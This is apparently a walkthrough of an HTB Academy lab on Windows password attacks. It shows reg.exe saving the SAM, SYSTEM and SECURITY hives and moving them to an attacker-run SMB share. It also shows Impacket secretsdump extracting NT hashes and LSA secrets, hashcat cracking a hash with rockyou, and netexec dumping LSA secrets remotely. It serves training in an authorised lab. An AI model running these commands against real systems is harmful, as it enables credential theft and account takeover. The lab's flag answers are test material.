### CPTS / HTB Penetration Tester Path <br>
### Password Attacks: Attacking SAM, SYSTEM, and SECURITY <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

IP: 10.129.202.137

---

### Question 1:
Where is the SAM database located in the Windows registry? (Format: `****\***`)

🚩 found **hklm\sam**.

---

### Question 2:
Apply the concepts taught in this section to obtain the password to the ITbackdoor user account on the target. Submit the clear-text password as the answer.

First, login to the winbox via RDP with the given creds. Then open up a privileged CMD, and save the registry hives:
```diff
+ C:\Windows\system32>reg.exe save hklm\sam C:\sam.save
+ C:\Windows\system32>reg.exe save hklm\system C:\system.save
+ C:\Windows\system32>reg.exe save hklm\security C:\security.save
```

	The operation completed successfully.

Now create an SMB server on your attack box:
```diff
+ $ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support susshare /home/htb-ac-830862/Documents
```

	Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
	
	[*] Config file parsed
	[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
	[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
	[*] Config file parsed
	[*] Config file parsed
	10/14/2025 09:49:45 PM: INFO: Config file parsed

And move the hive dumps into that smb share on the winbox:
```diff
+ move sam.save \\10.10.15.16\susshare
+ move system.save \\10.10.15.16\susshare
+ move security.save \\10.10.15.16\susshare
```

Now these 3 files appear in our shared folder on the attackbox. Lets dump the hashes using an Impacket script:
```diff
+ $ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

	Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
	
	[*] Target system bootKey: 0xd33955748b2d17d7b09c9cb2653dd0e8
	[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
	Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
	bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
	jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
	ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
	frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
	[*] Dumping cached domain logon information (domain/username:hash)
	[*] Dumping LSA Secrets
	[*] DPAPI_SYSTEM 
	dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
	dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
	[*] NL$KM 
	 0000   E4 FE 18 4B 25 46 81 18  BF 23 F5 A3 2A E8 36 97   ...K%F...#..*.6.
	 0010   6B A4 92 B3 A4 32 DE B3  91 17 46 B8 EC 63 C4 51   k....2....F..c.Q
	 0020   A7 0C 18 26 E9 14 5A A2  F3 42 1B 98 ED 0C BD 9A   ...&..Z..B......
	 0030   0C 1A 1B EF AC B3 76 C5  90 FA 7B 56 CA 1B 48 8B   ......v...{V..H.
	NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
	[*] _SC_gupdate 
	(Unknown User):Password123
	[*] Cleaning up...

The last string in the line for each user is the NT hash. Lets throw that in a file on our cracking rig:
```diff
+ $ echo c02478537b9727d391bc80011c2e2321 > cracky.txt
```

And finally, jimmy crack corn with hashcat:
```diff
+ $ sudo hashcat -m 1000 cracky.txt /mnt/SSD_DATA/SecLists/Passwords/Leaked-Databases/rockyou.txt -d 1,2
```

	hashcat (v6.2.6) starting
	
	CUDA API (CUDA 13.0)
	====================
	* Device #1: NVIDIA GeForce RTX 4070, 10194/11850 MB, 46MCU
	* Device #2: NVIDIA GeForce GTX 1080 Ti, 11022/11165 MB, 28MCU
	
	OpenCL API (OpenCL 3.0 CUDA 13.0.94) - Platform #1 [NVIDIA Corporation]
	=======================================================================
	* Device #3: NVIDIA GeForce RTX 4070, skipped
	* Device #4: NVIDIA GeForce GTX 1080 Ti, skipped
	
	Minimum password length supported by kernel: 0
	Maximum password length supported by kernel: 256
	
	Hashes: 1 digests; 1 unique digests, 1 unique salts
	Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
	Rules: 1
	
	Optimizers applied:
	* Zero-Byte
	* Early-Skip
	* Not-Salted
	* Not-Iterated
	* Single-Hash
	* Single-Salt
	* Raw-Hash
	
	ATTENTION! Pure (unoptimized) backend kernels selected.
	Pure kernels can crack longer passwords, but drastically reduce performance.
	If you want to switch to optimized kernels, append -O to your commandline.
	See the above message to find out about the exact limits.
	
	Watchdog: Temperature abort trigger set to 90c
	
	Host memory required for this attack: 1299 MB
	
	Dictionary cache built:
	* Filename..: /mnt/SSD_DATA/SecLists/Passwords/Leaked-Databases/rockyou.txt
	* Passwords.: 14344391
	* Bytes.....: 139921497
	* Keyspace..: 14344384
	* Runtime...: 1 sec
	
	c02478537b9727d391bc80011c2e2321:matrix
	
	Session..........: hashcat
	Status...........: Cracked
	Hash.Mode........: 1000 (NTLM)
	Hash.Target......: c02478537b9727d391bc80011c2e2321
	Time.Started.....: Tue Oct 14 23:20:14 2025 (0 secs)
	Time.Estimated...: Tue Oct 14 23:20:14 2025 (0 secs)
	Kernel.Feature...: Pure Kernel
	Guess.Base.......: File (/mnt/SSD_DATA/SecLists/Passwords/Leaked-Databases/rockyou.txt)
	Guess.Queue......: 1/1 (100.00%)
	Speed.#1.........:        0 H/s (0.00ms) @ Accel:2048 Loops:1 Thr:32 Vec:1
	Speed.#2.........: 28734.3 kH/s (5.19ms) @ Accel:2048 Loops:1 Thr:32 Vec:1
	Speed.#*.........: 28734.3 kH/s
	Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
	Progress.........: 1835008/14344384 (12.79%)
	Rejected.........: 0/1835008 (0.00%)
	Restore.Point....: 0/14344384 (0.00%)
	Restore.Sub.#1...: Salt:0 Amplifier:0-0 Iteration:0-1
	Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
	Candidate.Engine.: Device Generator
	Candidates.#1....: [Copying]
	Candidates.#2....: 123456 -> efer05
	Hardware.Mon.#1..: Temp: 56c Fan:  0% Util:  2% Core:2520MHz Mem:10251MHz Bus:16
	Hardware.Mon.#2..: Temp: 23c Fan:  0% Util: 30% Core:1721MHz Mem:5005MHz Bus:4
	
	Started: Tue Oct 14 23:20:00 2025
	Stopped: Tue Oct 14 23:20:15 2025

🚩 found **mat--edit--rix**.

---

### Question 3:
Dump the LSA secrets on the target and discover the credentials stored. Submit the username and password as the answer. (Format: username:password, Case-Sensitive)

We can remotely dump the LSA secrets with netexec:
```diff
+ $ netexec smb 10.129.202.137 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

	[*] First time use detected
	[*] Creating home directory structure
	[*] Creating missing folder logs
	[*] Creating missing folder modules
	[*] Creating missing folder protocols
	[*] Creating missing folder workspaces
	[*] Creating missing folder obfuscated_scripts
	[*] Creating missing folder screenshots
	[*] Creating default workspace
	[*] Initializing MSSQL protocol database
	[*] Initializing WINRM protocol database
	[*] Initializing LDAP protocol database
	[*] Initializing SMB protocol database
	[*] Initializing SSH protocol database
	[*] Initializing VNC protocol database
	[*] Initializing WMI protocol database
	[*] Initializing FTP protocol database
	[*] Initializing RDP protocol database
	[*] Copying default configuration file
	SMB         10.129.202.137  445    FRONTDESK01      [*] Windows 10 / Server 2019 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
	SMB         10.129.202.137  445    FRONTDESK01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
	SMB         10.129.202.137  445    FRONTDESK01      [+] Dumping LSA secrets
	SMB         10.129.202.137  445    FRONTDESK01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
	dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
	SMB         10.129.202.137  445    FRONTDESK01      NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
	SMB         10.129.202.137  445    FRONTDESK01      frontdesk:Password123
	SMB         10.129.202.137  445    FRONTDESK01      [+] Dumped 3 LSA secrets to /home/htb-ac-830862/.nxc/logs/FRONTDESK01_10.129.202.137_2025-10-14_222829.secrets and /home/htb-ac-830862/.nxc/logs/FRONTDESK01_10.129.202.137_2025-10-14_222829.cached

🚩 found **frontdesk:Pass--edit--123**.
